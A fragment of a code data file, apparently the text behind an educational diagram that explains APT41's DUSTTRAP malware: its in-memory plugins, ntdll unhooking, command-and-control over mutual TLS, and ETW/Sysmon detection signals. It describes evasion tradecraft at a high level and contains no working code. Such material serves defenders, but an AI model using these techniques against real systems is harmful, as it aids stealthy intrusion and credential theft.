          'With the phone lines un-tapped, the innermost doll (**DUSTTRAP**) snaps modular tool attachments (keylogger, credential harvester, file manager) directly into RAM as the remote operator requests them.',
        simpleExplanation:
          'With `ntdll.dll` unhooked, **DUSTTRAP** loads specialized in-memory plugins (file manager, shell executor, credential harvester, Active Directory recon) on demand and communicates with APT41’s C2 infrastructure over a custom mutual-TLS channel.',
        howItWorksInPractice:
          'Because each capability is delivered as a separate encrypted in-memory module only when needed, the full toolkit is never stored on the victim’s disk.',
        diagramAlignment:
          'On the diagram, arrow #3.1→ connects Node ④ (`wermgr.exe` running DUSTTRAP) to Node ⑤ (APT41 C2 Server) while Node ⑥ (SIEM / Kernel ETW) detects the `ntdll` remapping and network beacon.',
        detectionAndEvidence:
          'Documented in Kernel ETW (`EtwTiLogProtectVM`) & Sysmon EventID 3: `ntdll.dll` code page modification paired with persistent outbound TLS from `wermgr.exe` to non-Microsoft IPs.',
      },
    ],
  },
};
